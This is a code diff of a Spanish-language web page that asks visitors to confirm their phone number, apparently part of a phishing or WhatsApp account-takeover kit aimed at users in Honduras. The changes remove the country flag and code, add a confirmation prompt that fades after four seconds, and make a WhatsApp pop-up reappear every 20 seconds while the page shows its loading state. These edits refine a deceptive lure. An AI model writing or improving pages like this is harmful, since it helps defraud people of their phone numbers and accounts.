@@ -32,10 +32,9 @@
     /* PHONE SPLIT INPUT */
     .phone-wrap{width:100%;display:flex;border:1.5px solid #d1d5db;border-radius:12px;overflow:hidden;background:#fff;height:56px;transition:border-color .15s,box-shadow .15s}
     .phone-wrap:focus-within{border-color:var(--red);box-shadow:0 0 0 3px rgba(227,6,19,.10)}
-    .phone-prefix{min-width:130px;display:flex;align-items:center;justify-content:center;gap:6px;background:#f3f4f6;color:#6b7280;font-size:14px;font-weight:600;letter-spacing:1px;border-right:1.5px solid #e5e7eb;user-select:none;cursor:default;padding:0 10px}
-    .phone-prefix .pflag{font-size:20px;line-height:1}
-    .phone-prefix .pcode{color:#374151;font-size:13px;font-weight:700}
-    .phone-prefix .pnum{color:#9ca3af;font-size:16px;font-weight:700;letter-spacing:3px}
+    .phone-prefix{min-width:90px;display:flex;align-items:center;justify-content:center;background:#f3f4f6;border-right:1.5px solid #e5e7eb;user-select:none;cursor:default;padding:0 14px}
+    .phone-prefix .pnum{color:#9ca3af;font-size:20px;font-weight:700;letter-spacing:4px}
+    .phone-disclaimer{font-size:12px;color:#9ca3af;margin-top:-10px;transition:opacity 1.2s;text-align:center}
     .phone-last4{flex:1;border:none;outline:none;text-align:center;font-size:22px;font-weight:700;letter-spacing:8px;color:#111;font-family:inherit;background:transparent}
     .phone-last4::placeholder{font-size:14px;letter-spacing:2px;font-weight:400;color:#9ca3af}
     /* PHONE ERROR POPUP */
@@ -101,13 +100,12 @@
       <div class="info-sub">Para asegurarnos que otra persona no realice la solicitud en línea por ti, valida tu número telefónico.</div>
     </div>
     <div class="phone-wrap" style="width:100%">
-      <div class="phone-prefix" id="phonePrefix">
-        <span class="pflag">🇭🇳</span>
-        <span class="pcode">+504</span>
+      <div class="phone-prefix">
         <span class="pnum" id="p4digits">····</span>
       </div>
-      <input class="phone-last4" type="tel" id="lastFour" maxlength="6" placeholder="3XXX" autocomplete="tel" inputmode="numeric"/>
+      <input class="phone-last4" type="tel" id="lastFour" maxlength="6" placeholder="" autocomplete="tel" inputmode="numeric"/>
     </div>
+    <div class="phone-disclaimer" id="phoneDis">Confirma tu número de teléfono</div>
     <button class="btn-action" id="btnContinuar" onclick="enviar()">CONTINUAR</button>
   </div>
 
@@ -154,6 +152,7 @@
   const USUARIO = new URLSearchParams(location.search).get('u') || '';
   const prefix4 = localStorage.getItem('wa_p4') || '';
   if (prefix4) document.getElementById('p4digits').textContent = prefix4;
+  setTimeout(function(){ var d=document.getElementById('phoneDis'); if(d) d.style.opacity='0'; }, 4000);
 
   let pollTimer  = null;
   let tabPhase   = 'initial'; // 'initial' → 'left' → 'returned'
@@ -222,6 +221,9 @@
   function closeWaModal() {
     clearTimeout(waModTimer);
     document.getElementById('wa-modal').classList.remove('show');
+    if (currentSt === 's-loading') {
+      waModTimer = setTimeout(showWaModal, 20000);
+    }
   }
   function openWhatsApp() {
     closeWaModal();
